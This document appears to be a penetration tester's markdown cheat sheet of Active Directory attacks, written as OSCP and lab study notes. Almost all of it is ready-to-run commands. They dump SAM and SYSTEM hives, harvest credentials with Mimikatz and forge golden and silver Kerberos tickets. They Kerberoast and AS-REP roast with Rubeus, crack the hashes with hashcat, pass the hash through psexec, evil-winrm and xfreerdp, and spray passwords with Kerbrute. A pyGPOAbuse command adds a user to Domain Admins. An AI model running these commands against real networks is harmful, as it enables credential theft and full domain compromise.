# AD attacks

## Credfiles
Could be in the xxamp folder, dump SAM, a sql data base, look for everything!
```
UnattendedInstallFiles --> check for this with PowerUp
```
Example:
```
C:\Windows\Panther\unattend.xml
C:\Windows\System32\sysprep\sysprep.xml
```
With evil-winrm
```
reg save HKLM\SAM C:\users\administrator\Desktop\sam
reg save HKLM\SYSTEM C:\users\administrator\Desktop\system

download sam
download system
```
Then run impacket secertdumps:
```
impacket-secretsdump -sam sam -system system LOCAL
```

## Mimikatz:

I have found it hard in most boxes in proving grounds, but this command works instead. 
```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

```
### Golden Ticket Attack:

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```
Take the NTLM hash

Next, get the users SID:
```
whoami /user
```
Now make the request:
```
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-123456789-111111111-222222222 /krbtgt:4e3d1c7e3a6c2d6d9b3b5d7e8c9a1234 /id:500 /ptt
```
Explanation:

Parameter	Meaning
/user	user to impersonate
/domain	AD domain
/sid	domain SID
/krbtgt	KRBTGT NTLM hash
/id	RID (500 = Administrator)
/ptt	pass-the-ticket immediately

Verify ticket:
```
klist
```
Gain access:
```
dir \\DC01\c$
```
Or:
```
psexec \\DC01 cmd
```

### Sliver Ticket:

Get SID
```
whoami /user
```
Next dump the hash as before like the golden ticket attack:

```
sekurlsa::logonpasswords
```
Or
```
lsadump::sam
```
Same as before, make the ticket:
```
kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:<hash> /user:Administrator /ptt
```

## Rubeus
### Kerbroasting
```
Rubeus.exe kerberoast /outfile:hashes.txt
```
Then run hashcat or john:
```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Targeting a user:
```
Rubeus.exe kerberoast /user:svc_sql
```
```
Rubeus.exe kerberoast /creduser:corp\jdoe /credpassword:Password123
```
Then gain access: 
```
evil-winrm -i TARGET_IP -u svc_sql -p 'Summer2024!'
```
Or:
```
psexec.py corp.local/svc_sql:Summer2024!@TARGET_IP
```
### AS-REP Roasting
```
Rubeus.exe asreproast
```
Or:
```
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```
Crack the password:
```
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
Gain access:
```
evil-winrm -i TARGET -u USER -p PASSWORD
```

## Pass the Hash

Once you get the hash extracted you can also pass them:

Impacket:
```
psexec.py corp.local/Administrator@10.10.10.5 -hashes :5f4dcc3b5aa765d61d8327deb882cf99
wmiexec.py corp.local/Administrator@10.10.10.5 -hashes :5f4dcc3b5aa765d61d8327deb882cf99****
smbexec.py corp.local/Administrator@10.10.10.5 -hashes :HASH
```
Evil-winrm:
```
evil-winrm -i 10.10.10.5 -u Administrator -H 5f4dcc3b5aa765d61d8327deb882cf99
```
xfreerdp:
```
xfreerdp /v:TARGET_IP /u:USERNAME /pth:NTLM_HASH
xfreerdp /v:10.10.10.15 /u:Administrator /pth:HASH /cert:ignore
```

Mimikatz:
```
sekurlsa::pth /user: Administrator /domain:corp.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /run:cmd.exe
```
Then cmd here:
```
dir \\DC01\c$
```


## Tools
https://www.kali.org/tools/kerberoast/

## Kerbrute Install and Use
### Install
```
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
```
```
mv kerbrute_linux_amd64 kerbrute
```
```
chmod +x kerbrute
```
```
sudo mv kerbrute /usr/local/bin/
```
### Use
```
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```
```
kerbrute passwordspray -d domain.local users.txt Password123
```
## PyGPOAbuse
```
git clone https://github.com/Hackndo/pyGPOAbuse
```

```
python3 pygpoabuse.py 'domain.com/user:password' \
-gpo-id 'SID' \
-taskname 'webdev_disable' \
-dc-ip $target \
-powershell 'net group "Domain Admins" User /add'
```

## Links
I go over it in more detail in a blog post:

https://medium.com/@aaronashley466/oscp-notes-active-directory-and-pivoting-cheat-sheet-af42c46fd67b
